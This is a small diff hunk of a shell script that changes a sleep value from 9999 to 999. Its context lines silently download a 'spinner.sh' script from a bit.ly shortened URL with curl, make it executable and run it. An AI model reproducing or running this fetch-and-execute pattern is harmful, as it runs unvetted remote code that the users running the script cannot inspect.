@@ -5,4 +5,4 @@ curl -L -s -o spinner.sh https://bit.ly/3AEOj7j > /dev/null 2>&1
 chmod +x spinner.sh
 while [ ! -f done.txt ]; do ./spinner.sh sleep 1; done; 
 echo "You're all set !!!"
-./spinner.sh sleep 9999
+./spinner.sh sleep 999
